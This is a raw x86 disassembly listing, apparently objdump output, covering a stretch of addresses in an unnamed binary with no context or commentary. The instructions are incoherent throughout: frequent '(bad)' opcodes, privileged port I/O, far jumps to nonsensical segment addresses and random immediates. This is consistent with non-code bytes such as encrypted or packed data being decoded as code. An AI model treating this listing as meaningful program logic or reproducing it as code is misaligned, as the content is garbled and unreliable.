  407bb4:	fs mov al,0xac
  407bb7:	jno    0x407b67
  407bb9:	loopne 0x407b9d
  407bbb:	push   0xffffff8d
  407bbd:	loope  0x407bf8
  407bbf:	cmp    esp,eax
  407bc1:	je     0x407bb0
  407bc3:	push   esp
  407bc4:	xor    edi,DWORD PTR [edx]
  407bc6:	add    eax,DWORD PTR [eax-0x46]
  407bc9:	ins    BYTE PTR es:[edi],dx
  407bca:	dec    esp
  407bcb:	or     DWORD PTR [edi-0x33],0x9e1dce80
  407bd2:	mov    ch,0x59
  407bd4:	cdq    
  407bd5:	test   DWORD PTR [eax+0x36],ebp
  407bd8:	stos   BYTE PTR es:[edi],al
  407bd9:	mov    BYTE PTR [ecx],ah
  407bdb:	fcmovnbe st,st(1)
  407bdd:	add    BYTE PTR [edx+0x3c],dh
  407be0:	and    eax,edx
  407be2:	sbb    ebp,DWORD PTR [ebp-0x6e]
  407be5:	mov    ecx,0xf1e8107e
  407bea:	add    eax,0x3d2fb1f7
  407bef:	xor    ch,0x74
  407bf2:	imul   edi,edx,0x72
  407bf5:	mov    dl,0x32
  407bf7:	xor    DWORD PTR [eax-0x64],eax
  407bfa:	int3   
  407bfb:	fwait
  407bfc:	xchg   esi,eax
  407bfd:	mov    gs,WORD PTR [ecx]
  407bff:	push   esi
  407c00:	jns    0x407c5b
  407c02:	sbb    DWORD PTR [ebx-0x55c1b23f],0xffffffc4
  407c09:	push   ds
  407c0a:	add    eax,0x8efe8f78
  407c0f:	dec    ebx
  407c10:	dec    ebp
  407c11:	mov    cl,0x97
  407c13:	ja     0x407c72
  407c15:	fidiv  DWORD PTR [eax+0x2de12f83]
  407c1b:	push   ss
  407c1c:	aad    0x37
  407c1e:	mov    ds:0x62977cef,eax
  407c23:	or     eax,0x90681c7d
  407c28:	add    al,0xb0
  407c2a:	in     al,0x13
  407c2c:	dec    eax
  407c2d:	out    0xa3,eax
  407c2f:	mov    ch,0x8c
  407c31:	or     eax,0x1f11a074
  407c36:	ret    0x9c96
  407c39:	jb     0x407bd6
  407c3b:	cmp    BYTE PTR [esi+0xd],0xff
  407c3f:	out    0x74,eax
  407c41:	iret   
  407c42:	xchg   ebx,eax
  407c43:	xor    DWORD PTR [edx+edi*8],esp
  407c46:	inc    edi
  407c47:	inc    esi
  407c48:	inc    ecx
  407c49:	cmp    eax,0xe2788f0b
  407c4e:	add    DWORD PTR [ecx-0x4b],0x2
  407c52:	pop    ebx
  407c53:	sbb    esi,ebp
  407c55:	cmp    al,0x5f
  407c57:	xor    DWORD PTR [ebp-0x4d],eax
  407c5a:	dec    ebp
  407c5b:	stos   BYTE PTR es:[edi],al
  407c5c:	fs and ah,0x5d
  407c60:	mov    edx,0x2ae6a988
  407c65:	xor    eax,0xb5ac83e1
  407c6a:	jp     0x407c38
  407c6c:	or     BYTE PTR [edi+0x45],0xe2
  407c70:	inc    esp
  407c71:	adc    al,0x3d
  407c73:	ins    BYTE PTR es:[edi],dx
  407c74:	sahf   
  407c75:	xchg   edx,eax
  407c76:	add    dh,BYTE PTR [ebx]
  407c78:	mov    bl,BYTE PTR [edx+edi*2]
  407c7b:	int3   
  407c7c:	mov    ch,0x2c
  407c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c7f:	sbb    BYTE PTR [ebp-0x1f7fb9d8],al
  407c85:	adc    ebp,ebx
  407c87:	inc    ebx
  407c88:	das    
  407c89:	sub    DWORD PTR [ecx-0x53c8d795],esp
  407c8f:	ss sub bl,dh
  407c92:	dec    edx
  407c93:	outs   dx,DWORD PTR ds:[esi]
  407c94:	jno    0x407c2b
  407c96:	pop    edx
  407c97:	mov    al,0x8
  407c99:	in     al,0x83
  407c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c9c:	mov    dh,0x25
  407c9e:	inc    esi
  407c9f:	in     al,dx
  407ca0:	sbb    bl,cl
  407ca2:	push   eax
  407ca3:	ret    0x4c74
  407ca6:	(bad)  
  407ca7:	dec    esi
  407ca8:	mov    edi,0x415dee86
  407cad:	mov    eax,0xfee6079b
  407cb2:	jle    0x407cc1
  407cb4:	(bad)  
  407cb5:	jo     0x407cc5
  407cb7:	int    0xa8
  407cb9:	mov    eax,ds:0xba7ce89d
  407cbe:	fs aam 0x1
  407cc1:	jnp    0x407c98
  407cc3:	cmp    esi,DWORD PTR [esi+0x47d536c5]
  407cc9:	inc    edi
  407cca:	fs cmp al,0x15
  407ccd:	xchg   edi,eax
  407cce:	inc    ebx
  407ccf:	lahf   
  407cd0:	fisttp QWORD PTR [esi-0x3933bf4b]
  407cd6:	loopne 0x407ce2
  407cd8:	mov    WORD PTR [esi+0x4e5860b],gs
  407cde:	in     eax,0xfe
  407ce0:	inc    edx
  407ce1:	sahf   
  407ce2:	repnz outs dx,BYTE PTR ds:[esi]
  407ce4:	lea    ebx,[esi+0xb]
  407ce7:	pop    ecx
  407ce8:	adc    eax,0x9eaf9ab8
  407ced:	or     BYTE PTR [esi+ecx*1],dh
  407cf0:	inc    eax
  407cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cf2:	call   0xd2c:0xd6cb1225
  407cf9:	div    bl
  407cfb:	loope  0x407d01
  407cfd:	loope  0x407cb5
  407cff:	xchg   BYTE PTR [ebp-0x3a],dl
  407d02:	mov    ah,0xc3
  407d04:	mov    esi,0xa3b2d93d
  407d09:	mov    cs,WORD PTR [ecx-0x7e]
  407d0c:	xor    BYTE PTR [ebx],0xb8
  407d0f:	(bad)  
  407d10:	xor    ch,BYTE PTR [esi]
  407d12:	repnz and esi,DWORD PTR [eax-0x6aafc62c]
  407d19:	cmp    eax,0x2c1e2c13
  407d1e:	cdq    
  407d1f:	les    eax,FWORD PTR [esi+edi*2]
  407d22:	addr16 push 0xb406de00
  407d28:	lock mov BYTE PTR [edx-0x18],al
  407d2c:	pop    es
  407d2d:	mov    DWORD PTR [edx+0x3ce49cf8],ecx
  407d33:	mov    gs,ebx
  407d35:	inc    ebp
  407d36:	fs (bad) 
  407d38:	jae    0x407d6b
  407d3a:	adc    eax,0x24e67d6e
  407d3f:	dec    edx
  407d40:	pop    ebp
  407d41:	push   edi
  407d42:	sbb    bl,BYTE PTR [esi]
  407d44:	push   ecx
  407d45:	daa    
  407d46:	jmp    0xb6528911
  407d4b:	sub    eax,0x5265c7f4
  407d50:	jle    0x407d78
  407d52:	es and ecx,ecx
  407d55:	das    
  407d56:	add    ah,dl
  407d58:	mov    BYTE PTR [edx+ebx*8+0x4ef31da5],0x3f
  407d60:	gs jmp 0xae5:0xad67222e
  407d68:	aam    0x50
  407d6a:	jne    0x407dbf
  407d6c:	ja     0x407d12
  407d6e:	ins    DWORD PTR es:[edi],dx
  407d6f:	push   cs
  407d70:	cwde   
  407d71:	add    BYTE PTR [edx+esi*2-0x6c4022cb],dh
  407d78:	ja     0x407dbc
  407d7a:	pop    ebp
  407d7b:	add    DWORD PTR [esi+0x29],ebp
  407d7e:	xor    DWORD PTR [ecx-0x6c],ecx
  407d81:	fwait
  407d82:	je     0x407d1f
  407d84:	and    BYTE PTR [edx+0x7c],ch
  407d87:	gs ds or al,0x8f
  407d8b:	lahf   
  407d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d8d:	mov    ecx,0xd32c8b28
  407d92:	inc    esi
  407d93:	mov    cl,0x2a
  407d95:	sbb    ebx,esi
  407d97:	popa   
  407d98:	ins    DWORD PTR es:[edi],dx
  407d99:	mov    dl,0x8
  407d9b:	mov    DWORD PTR [edi+0x298eef34],ecx
  407da1:	or     ebp,DWORD PTR [edx]
  407da3:	push   esi
  407da4:	iret   
  407da5:	dec    DWORD PTR [eax-0x83fd21e]
  407dab:	and    eax,0x4bd55d77
  407db0:	xchg   ebx,esi
  407db2:	mov    ah,0x82
  407db4:	dec    ebx
  407db5:	into   
  407db6:	sahf   
  407db7:	out    0x22,al
  407db9:	push   0xffffff87
  407dbb:	push   edi
  407dbc:	jnp    0x407df4
  407dbe:	ret    0xacc4
  407dc1:	push   0xbcf35e4c
  407dc6:	in     eax,0x73
  407dc8:	dec    edx
  407dc9:	push   ebx
  407dca:	fmul   st(7),st
  407dcc:	cmp    al,0xfe
  407dce:	js     0x407e00
  407dd0:	jle    0x407dfb
  407dd2:	outs   dx,DWORD PTR ds:[esi]
  407dd3:	or     BYTE PTR [esi],bl
  407dd5:	and    ebx,DWORD PTR [esi-0x400c07ed]
  407ddb:	mov    dh,0x2e
  407ddd:	stos   BYTE PTR es:[edi],al
  407dde:	mov    eax,0x365fbb0f
  407de3:	(bad)  
  407de4:	arpl   di,cx
  407de6:	stos   DWORD PTR es:[edi],eax
  407de7:	and    ebp,ebx
  407de9:	sbb    dh,BYTE PTR [edi+0x42]
  407dec:	adc    edx,DWORD PTR fs:[ebx]
  407def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df0:	ror    DWORD PTR [ecx],cl
  407df2:	out    0xc2,al
  407df4:	fnstsw WORD PTR ds:0x63387562
  407dfa:	mov    cl,0x6
  407dfc:	sub    BYTE PTR [edi],al
  407dfe:	xor    BYTE PTR [edx],ah
  407e00:	push   ebp
  407e01:	add    eax,0x2687343e
  407e06:	pop    ecx
  407e07:	jno    0x407e4c
  407e09:	mov    cl,0x24
  407e0b:	imul   edi,DWORD PTR [esi-0x63f487db],0x8b7a002b
  407e15:	cmp    cl,BYTE PTR [edx+edx*1-0x20b3c8ea]
  407e1c:	add    bl,ah
  407e1e:	cmp    BYTE PTR [esi-0x1ad7cd0d],dl
  407e24:	mov    bl,0x4c
  407e26:	arpl   WORD PTR [ebx],dx
  407e28:	imul   ebx,edx,0xffffff8c
  407e2b:	sub    edi,ebp
  407e2d:	jnp    0x407df2
  407e2f:	xchg   esp,eax
  407e30:	jmp    0xda74:0x6426b615
  407e37:	inc    edx
  407e38:	sti    
  407e39:	and    al,0xa2
  407e3b:	ret    0x435c
  407e3e:	in     al,dx
  407e3f:	add    bh,BYTE PTR ds:0x726e512a
  407e45:	or     eax,esp
  407e47:	xlat   BYTE PTR ds:[ebx]
  407e48:	jb     0x407eb3
  407e4a:	jmp    0x5ccaf1e
  407e4f:	enter  0xf5d,0x95
  407e53:	into   
  407e54:	or     DWORD PTR [esi-0x29],ebx
  407e57:	mov    dl,0xfa
  407e59:	push   ds
  407e5a:	call   0x204f:0x20d72fa8
  407e61:	mov    ebx,0xd11c01cf
  407e66:	cs pop ebp
  407e68:	icebp  
  407e69:	mov    ebx,esi
  407e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e6c:	icebp  
  407e6d:	jae    0x407e62
  407e6f:	popf   
  407e70:	shl    bh,cl
  407e72:	scas   eax,DWORD PTR es:[edi]
  407e73:	mov    BYTE PTR [esi-0x6ab93822],cl
  407e79:	push   ebp
  407e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e7b:	mov    ss,WORD PTR [esi+ebp*1]
  407e7e:	retf   0x3352
  407e81:	mov    ch,0xf4
  407e83:	add    eax,0x22c334fe
  407e88:	mov    WORD PTR [edx+0x3aaaa8c6],?
  407e8e:	jnp    0x407e91
  407e90:	add    ch,BYTE PTR [eax+0x73]
  407e93:	and    dl,BYTE PTR [edx-0x41]
  407e96:	cdq    
  407e97:	mov    ds:0xd067983e,al
  407e9c:	dec    ebx
  407e9d:	ins    BYTE PTR es:[edi],dx
  407e9e:	mov    ebx,0x6550edf0
  407ea3:	mov    al,0xfc
  407ea5:	jns    0x407e74
  407ea7:	(bad)  
  407ea8:	retf   
  407ea9:	xor    DWORD PTR [ebp-0x4d],eax
  407eac:	sbb    al,0x21
  407eae:	enter  0x8aad,0x34
  407eb2:	jbe    0x407e55
  407eb4:	repz cmp eax,0x9602f664
  407eba:	cwde   
  407ebb:	fwait
  407ebc:	add    edx,DWORD PTR [eax]
  407ebe:	inc    eax
  407ebf:	leave  
  407ec0:	push   ecx
  407ec1:	dec    ecx
  407ec2:	mov    al,0x34
  407ec4:	xor    eax,0x5cbcd678
  407ec9:	add    esi,DWORD PTR [edx]
  407ecb:	xchg   ebp,eax
  407ecc:	jno    0x407e89
  407ece:	dec    ecx
  407ecf:	cwde   
  407ed0:	jmp    0x55767d0f
  407ed5:	(bad)  
  407ed6:	shr    ch,cl
  407ed8:	sbb    DWORD PTR [ecx],ebp
  407eda:	inc    ecx
  407edb:	addr16 push ss
  407edd:	dec    edi
  407ede:	mov    eax,0xc82c6eb3
  407ee3:	mov    ds:0x7fa54b21,eax
  407ee8:	sbb    ah,dh
  407eea:	pop    DWORD PTR [esi-0x337bc783]
  407ef0:	jno    0x407f25
  407ef2:	in     al,0x3c
  407ef4:	arpl   WORD PTR [esi],di
  407ef6:	inc    ecx
  407ef7:	mov    ds:0x3ccb6741,al
  407efc:	fwait
  407efd:	dec    esi
  407efe:	fdivr  QWORD PTR [ebx+0x72]
  407f01:	jp     0x407ec4
  407f03:	fs lock xchg edi,eax
  407f06:	aaa    
  407f07:	out    0x45,al
  407f09:	ins    DWORD PTR es:[edi],dx
  407f0a:	int3   
  407f0b:	aam    0x16
  407f0d:	iret   
  407f0e:	out    0x68,eax
  407f10:	scas   al,BYTE PTR es:[edi]
  407f11:	in     eax,dx
  407f12:	push   esp
  407f13:	push   ebx
  407f14:	push   esp
  407f15:	pop    ecx
  407f16:	gs push edi
  407f18:	icebp  
  407f19:	test   dl,ch
  407f1b:	push   ds
  407f1c:	iret   
  407f1d:	in     eax,0xaa
  407f1f:	outs   dx,DWORD PTR ds:[esi]
  407f20:	xchg   DWORD PTR ds:0xd2ad04b1,eax
  407f26:	adc    al,0xa3
  407f28:	out    0x2b,eax
  407f2a:	xor    esi,esp
  407f2c:	test   al,0xe7
  407f2e:	cdq    
  407f2f:	bound  ebp,QWORD PTR [eax+eiz*4-0x4]
  407f33:	mul    ebx
  407f35:	lds    ebx,FWORD PTR [edi-0x3f3f6b7d]
  407f3b:	hlt    
  407f3c:	pop    es
  407f3d:	push   ebp
  407f3e:	xchg   esp,eax
  407f3f:	test   DWORD PTR [ecx-0x7a],0x3a1d1c9a
  407f46:	push   ebx
  407f47:	jmp    0x407ee0
  407f49:	sar    edx,cl
  407f4b:	sub    bl,BYTE PTR ds:0xf20ad543
  407f51:	ins    DWORD PTR es:[edi],dx
  407f52:	loop   0x407f0b
  407f54:	cs jae 0x407f39
  407f57:	push   edi
  407f58:	jl     0x407fae
  407f5a:	cld    
  407f5b:	pushf  
  407f5c:	aas    
  407f5d:	or     ah,BYTE PTR es:[edx-0x2078681c]
  407f64:	xchg   edx,eax
  407f65:	aad    0xb9
  407f67:	pop    ecx
  407f68:	xchg   edx,eax
  407f69:	or     DWORD PTR [esi+ebp*1-0x4f36f1ca],ebp
  407f70:	ins    BYTE PTR es:[edi],dx
  407f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f72:	jnp    0x407f9d
  407f74:	or     DWORD PTR [ebx+0x52],ebx
  407f77:	(bad)  
  407f78:	pusha  
  407f79:	push   0xdc66e7a8
  407f7e:	ins    DWORD PTR es:[edi],dx
  407f7f:	add    al,0x8f
  407f81:	add    eax,DWORD PTR [edx+0x52]
  407f84:	daa    
  407f85:	and    edx,DWORD PTR [edi+0x7f33be50]
  407f8b:	ja     0x407f16
  407f8d:	fwait
  407f8e:	add    al,0x12
  407f90:	sbb    ah,dh
  407f92:	inc    ebp
  407f93:	inc    eax
  407f94:	and    BYTE PTR [ebp-0x6b],ch
  407f97:	push   eax
  407f98:	test   DWORD PTR [edx],ecx
  407f9a:	xor    ebx,esp
  407f9c:	pop    edx
  407f9d:	lds    edi,FWORD PTR [edi+eiz*1+0x420d6e8e]
  407fa4:	cmp    eax,0xb5ba96e6
  407fa9:	(bad)  
  407faa:	xor    edx,DWORD PTR [ebx-0x22bb2df2]
  407fb0:	sbb    al,0xa7
  407fb2:	jmp    0x74d4:0x1fff0b90
  407fb9:	stos   DWORD PTR es:[edi],eax
  407fba:	iret   
  407fbb:	shr    BYTE PTR [eax+0x672d8d6b],1
  407fc1:	mov    dl,BYTE PTR ds:0x8ed8a2be
  407fc7:	adc    BYTE PTR ds:[edi+ecx*4+0x9bd92be],bh
  407fcf:	les    ebp,FWORD PTR [edx]
  407fd1:	neg    BYTE PTR [edi+0x4c350534]
  407fd7:	fneni(8087 only) 
  407fd9:	mov    esi,0x9d360d26
  407fde:	aad    0x42
  407fe0:	les    edi,FWORD PTR gs:[ebp+0x7854bfad]
  407fe7:	out    dx,al
  407fe8:	outs   dx,DWORD PTR ds:[esi]
  407fe9:	or     al,0xbd
  407feb:	clc    
  407fec:	mov    ds:0xe4c6b483,al
  407ff1:	fwait
  407ff2:	mul    BYTE PTR [ebx-0x53bd6edb]
  407ff8:	lods   eax,DWORD PTR ds:[esi]
  407ff9:	sub    BYTE PTR [eax-0x49],ah
  407ffc:	jle    0x407f83
  407ffe:	and    al,BYTE PTR [eax]
  408000:	jl     0x407f9c
  408002:	shl    DWORD PTR [edi-0xa6a4539],0xb4
  408009:	mov    bl,0xa
  40800b:	push   es
  40800c:	xor    BYTE PTR [ebp-0x1605aa8c],ah
  408012:	out    dx,al
  408013:	mov    ebx,0x8c6ac042
  408018:	sar    DWORD PTR [edx],1
  40801a:	sbb    al,0x72
  40801c:	shl    edx,cl
  40801e:	mov    eax,ds:0x14b6ff7a
  408023:	push   edx
  408024:	inc    ebp
  408025:	ret    0x6e36
  408028:	std    
  408029:	popa   
  40802a:	jnp    0x408010
  40802c:	ss xchg ebp,edx
  40802f:	mov    bh,0x87
  408031:	mov    ebx,0x996177da
  408036:	pop    esi
  408037:	jne    0x407fd8
  408039:	dec    ecx
  40803a:	mov    al,0x91
  40803c:	cld    
  40803d:	scas   eax,DWORD PTR es:[edi]
  40803e:	pop    edi
  40803f:	push   edx
  408040:	mov    al,ds:0x22d6f98b
  408045:	stc    
  408046:	hlt    
  408047:	leave  
  408048:	fs scas eax,DWORD PTR es:[edi]
  40804a:	mov    BYTE PTR [eax-0x76],cl
  40804d:	repz dec ebx
  40804f:	cmc    
  408050:	jecxz  0x4080a5
  408052:	xchg   esp,eax
  408053:	adc    dh,BYTE PTR [ebp-0x64]
  408056:	inc    eax
  408057:	mov    edi,ds
  408059:	sti    
  40805a:	repnz or DWORD PTR [ecx+0x30],esp
  40805e:	icebp  
  40805f:	sbb    DWORD PTR [edx-0x73f918aa],0x23f7afd5
  408069:	xor    al,0x20
  40806b:	jno    0x40803e
  40806d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40806e:	clc    
  40806f:	sub    esp,DWORD PTR [ebp+0x31a54e04]
  408075:	ds dec edi
  408077:	rcl    DWORD PTR [ecx-0x4a],cl
  40807a:	or     eax,0x2ddcc532
  40807f:	jnp    0x408029
  408081:	and    bh,BYTE PTR [esi-0x10]
  408084:	iret   
  408085:	xchg   esp,eax
  408086:	jecxz  0x4080c2
  408088:	mov    ch,0xd3
  40808a:	xlat   BYTE PTR ds:[ebx]
  40808b:	inc    esp
  40808c:	aaa    
  40808d:	ror    DWORD PTR [ecx+eax*2+0x35db4fd],1
  408094:	sub    ecx,edx
  408096:	pop    edi
  408097:	jg     0x40806d
  408099:	lea    ebx,cs:[edi-0x16]
  40809d:	bound  esi,QWORD PTR [ebx-0x4a49b5a8]
  4080a3:	(bad)  
  4080a4:	jae    0x40809a
  4080a6:	xor    cl,ch
  4080a8:	mov    edi,0x4d015dea
  4080ad:	fidiv  WORD PTR [edx+ebx*4+0x4db81183]
  4080b4:	sub    al,0x9c
  4080b6:	inc    esp
  4080b7:	outs   dx,BYTE PTR ds:[esi]
  4080b8:	dec    ebp
  4080b9:	(bad)  
  4080ba:	aaa    
  4080bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080bc:	shl    BYTE PTR [edx],1
  4080be:	stc    
  4080bf:	xlat   BYTE PTR cs:[ebx]
  4080c1:	(bad)  ds:0x2859ad7c
  4080c7:	xor    esp,DWORD PTR fs:[edx+0xf6b2c31]
  4080ce:	stc    
  4080cf:	cmp    ecx,DWORD PTR [ebx+0x42]
  4080d2:	cmp    BYTE PTR [ebp+0x57547e05],ch
  4080d8:	inc    ebx
  4080d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080da:	enter  0x6513,0x60
  4080de:	repz leave 
  4080e0:	mov    ch,0xe5
  4080e2:	dec    esi
  4080e3:	aas    
  4080e4:	mov    WORD PTR cs:[edi],es
  4080e7:	enter  0xcc26,0x9e
  4080eb:	xchg   ecx,eax
  4080ec:	mov    cl,0x2a
  4080ee:	pop    edx
  4080ef:	xor    edx,edx
  4080f1:	retf   
  4080f2:	add    eax,DWORD PTR [edx-0x2a]
  4080f5:	jne    0x40807f
  4080f7:	(bad)  
  4080f8:	sub    ch,bl
  4080fa:	(bad)  
  4080fb:	ss cwde 
  4080fd:	push   ebx
  4080fe:	cmp    al,0x41
  408101:	mov    edi,DWORD PTR [edi+ebp*8]
  408104:	je     0x4080c2
  408106:	fist   WORD PTR [ecx+ebx*1]
  408109:	pop    esi
  40810a:	jge    0x40814e
  40810c:	fld    DWORD PTR [ebp-0xf]
  40810f:	mov    bl,0xc4
  408111:	leave  
  408112:	ja     0x40813e
  408114:	mov    bl,0x57
  408116:	add    eax,0xe17274f4
  40811b:	sub    eax,DWORD PTR [edx]
  40811d:	mov    ebx,DWORD PTR [edi-0x4b]
  408120:	loope  0x408166
  408122:	add    DWORD PTR [edi+0x6542884c],ebx
  408128:	in     al,0x44
  40812a:	rcr    edi,1
  40812c:	mov    bl,0xf1
  40812e:	mov    DWORD PTR [edx],esp
  408130:	jmp    0xef4f0e9
  408135:	imul   ecx,edi,0xb557ca14
  40813b:	xor    BYTE PTR [ecx],ch
  40813d:	adc    al,0x86
  40813f:	sahf   
  408140:	jmp    0xf193:0xc0f3ebf9
  408147:	ret    
  408148:	cli    
  408149:	test   BYTE PTR [ebx+ebp*4-0x11],ch
  40814d:	popa   
  40814e:	push   edx
  40814f:	int    0xf2
  408151:	inc    edi
  408152:	inc    esp
  408153:	sbb    BYTE PTR [edi-0x2c98386e],0x3f
  40815a:	or     ebp,DWORD PTR [ebp+0x76]
  40815d:	sar    DWORD PTR [ecx-0x45b44295],1
  408163:	stos   BYTE PTR es:[edi],al
  408164:	scas   al,BYTE PTR es:[edi]
  408165:	aas    
  408166:	ss out 0xcb,al
  408169:	jbe    0x4081ea
  40816b:	add    BYTE PTR [edx+edi*8],bh
  40816e:	cli    
  40816f:	rcl    DWORD PTR [ebx+0x5b],cl
  408172:	xor    eax,0x2d9ba06
  408177:	(bad)  
  408178:	jne    0x408163
  40817a:	pop    edx
  40817b:	lds    edx,FWORD PTR [esi+edx*8+0x21]
  40817f:	pop    eax
  408180:	out    0x8f,eax
  408182:	mov    al,0x20
  408184:	adc    DWORD PTR [ebp+ebp*4+0x5a],0xffffffae
  408189:	mov    eax,0x6759697f
  40818e:	adc    ah,BYTE PTR [esi+0x56a70de8]
  408194:	mov    ah,0xe6
  408196:	scas   al,BYTE PTR es:[edi]
  408197:	arpl   WORD PTR [ebx-0x4c],bp
  40819a:	fisubr WORD PTR [edx]
  40819c:	cs jbe 0x4081ac
  40819f:	in     al,0xef
  4081a1:	mov    dl,0x85
  4081a3:	lods   al,BYTE PTR ds:[esi]
  4081a4:	xor    BYTE PTR [edi],0xe5
  4081a7:	test   DWORD PTR [ebp+ecx*1-0x35],esp
  4081ab:	push   esi
  4081ac:	fwait
  4081ad:	outs   dx,DWORD PTR ds:[esi]
  4081ae:	std    
  4081af:	inc    ecx
  4081b0:	pop    ebp
  4081b1:	outs   dx,BYTE PTR ds:[esi]
  4081b2:	pop    ds
  4081b3:	scas   eax,DWORD PTR es:[edi]
  4081b4:	jecxz  0x408220
  4081b6:	dec    esi
  4081b7:	cmp    ebp,ebx
  4081b9:	pop    es
  4081ba:	hlt    
  4081bb:	mov    esi,0xdf5c1c5b
  4081c0:	push   ebp
  4081c1:	out    dx,al
  4081c2:	push   ss
  4081c3:	pop    edx
  4081c4:	jbe    0x40821a
  4081c6:	aad    0x34
  4081c8:	inc    ecx
  4081c9:	fnstenv [eax]
  4081cb:	pop    edx
  4081cc:	mov    ds:0xcb58b058,al
  4081d1:	in     al,0xb3
  4081d3:	aam    0x29
  4081d5:	push   0x1c9c54a
  4081da:	jg     0x4081bd
  4081dc:	mov    ah,0x75
  4081de:	jae    0x4081f2
  4081e0:	sub    al,0x83
  4081e2:	dec    ecx
  4081e3:	xor    esp,DWORD PTR ds:0xef3c79ff
  4081e9:	mov    dh,BYTE PTR ss:[edi+0x54]
  4081ed:	mov    dl,0x81
  4081ef:	sub    ah,dh
  4081f1:	repnz outs dx,BYTE PTR ds:[esi]
  4081f3:	push   eax
  4081f4:	cmp    eax,0x5dd9cb99
  4081f9:	pop    edi
  4081fa:	inc    ebp
  4081fb:	faddp  st(3),st
  4081fd:	loope  0x4081a7
  4081ff:	jg     0x4081cb
  408201:	pop    ss
  408202:	cmp    DWORD PTR ds:0xd4c93064,0x5ff378a3
  40820c:	xchg   edx,eax
  40820d:	enter  0x26e6,0x12
  408211:	mov    bh,0x2b
  408213:	ror    edi,cl
  408215:	bound  edx,QWORD PTR [ebp+0x1a1c160]
  40821b:	ins    BYTE PTR es:[edi],dx
  40821c:	sub    eax,0x85107a64
  408221:	pusha  
  408222:	dec    eax
  408223:	out    dx,eax
  408224:	mov    al,ds:0xbc34e02f
  408229:	test   DWORD PTR [ebp-0x73],0x8ab02df1
  408230:	fdiv   DWORD PTR [eax]
  408232:	mov    dl,0x28
  408234:	xchg   edx,eax
  408235:	fwait
  408236:	imul   ecx,ebp,0xb5aa200d
  40823c:	push   ds
  40823d:	cld    
  40823e:	inc    ebp
  40823f:	in     al,0x6f
  408241:	iret   
  408242:	out    dx,al
  408243:	jnp    0x4082c4
  408245:	ins    DWORD PTR es:[edi],dx
  408246:	mov    esi,0x9cc77858
  40824b:	std    
  40824c:	cmp    esp,eax
  40824e:	mov    al,ds:0x48e5ee6c
  408253:	dec    eax
  408254:	stc    
  408255:	xchg   ebx,eax
  408256:	or     dl,BYTE PTR ds:0x138d752e
  40825c:	fsubr  QWORD PTR [ecx]
  40825e:	leave  
  40825f:	leave  
  408260:	shl    DWORD PTR [edi+edi*8+0x3611a60a],1
  408267:	dec    eax
  408268:	jg     0x40824f
  40826a:	imul   esi,DWORD PTR [esi+eax*4-0x1],0x78252cb6
  408272:	add    eax,0x6d45944f
  408277:	jnp    0x408285
  408279:	shl    BYTE PTR [edi],cl
  40827b:	sti    
  40827c:	popa   
  40827d:	xlat   BYTE PTR ds:[ebx]
  40827e:	mov    cl,0x9d
  408280:	and    al,bh
  408282:	mov    ds:0x8a018e3e,al
  408287:	in     al,dx
  408288:	pop    es
  408289:	mov    al,ds:0xb51d18c4
  40828e:	push   es
  40828f:	cmp    al,0x62
  408291:	sub    bl,BYTE PTR [ebx*2+0x3cae861e]
  408298:	or     eax,0x3ee4666e
  40829d:	lock lods al,BYTE PTR ds:[esi]
  40829f:	mov    al,ds:0x2ad01b72
  4082a4:	cmp    eax,0x8ce01eb6
  4082a9:	jge    0x40825d
  4082ab:	cmp    DWORD PTR [edi+ecx*1+0x7a2d9b2c],edi
  4082b2:	in     eax,0xaf
  4082b4:	adc    al,bh
  4082b6:	ffree  st(4)
  4082b8:	dec    esp
  4082b9:	icebp  
  4082ba:	popf   
  4082bb:	in     al,0x33
  4082bd:	inc    edx
  4082be:	popf   
  4082bf:	out    dx,al
  4082c0:	lahf   
  4082c1:	cmp    bl,ch
  4082c3:	mov    bh,0x10
  4082c5:	sbb    al,0x8c
  4082c7:	pop    edi
  4082c8:	push   ss
  4082c9:	(bad)  
  4082ca:	out    dx,al
  4082cb:	cld    
  4082cc:	(bad)  
  4082ce:	push   0x6
  4082d0:	jmp    0x42297230
  4082d5:	jb     0x40825f
  4082d7:	xchg   edx,eax
  4082d8:	jne    0x4082fa
  4082da:	cmp    DWORD PTR [eax+edi*2],esp
  4082dd:	lds    esi,FWORD PTR [eax+0xa146906]
  4082e3:	pop    esi
  4082e4:	dec    ebx
  4082e5:	js     0x408328
  4082e7:	ret    0xdabb
  4082ea:	mov    esi,0xc562d1aa
  4082ef:	add    eax,0xfc131cec
  4082f4:	add    BYTE PTR [ebp+0x244a7d51],dh
  4082fa:	or     al,0xaf
  4082fc:	xor    DWORD PTR ds:0xa415d66e,eax
  408302:	mov    al,0xfd
  408304:	fs jmp 0x44e4:0x662ed13e
  40830c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40830d:	outs   dx,BYTE PTR ds:[esi]
  40830e:	inc    esp
  40830f:	pusha  
  408310:	cmp    edx,DWORD PTR [esi-0x3e0c858d]
  408316:	daa    
  408317:	jns    0x408390
  408319:	push   ss
  40831a:	popa   
  40831b:	add    dl,BYTE PTR [edi]
  40831d:	outs   dx,DWORD PTR ds:[esi]
  40831e:	out    dx,eax
  40831f:	xor    eax,0x15368cf1
  408324:	mov    ds:0x6b2eff6e,eax
  408329:	sub    dh,cl
  40832b:	adc    BYTE PTR [esi+esi*8+0x31d6bf49],ah
  408332:	push   esi
  408333:	(bad)  
  408334:	adc    bl,BYTE PTR [edi-0x7c]
  408337:	jns    0x408339
  408339:	lock in eax,dx
  40833b:	and    al,0xf2
  40833d:	cdq    
  40833e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40833f:	add    eax,0x3c3045dc
  408344:	mov    esp,DWORD PTR [edx]
  408346:	adc    BYTE PTR [esi-0x6e],bh
  408349:	dec    eax
  40834a:	cmp    edx,DWORD PTR [edx]
  40834c:	or     eax,0x1e2943c8
  408351:	in     eax,dx
  408352:	xor    eax,0x19feab73
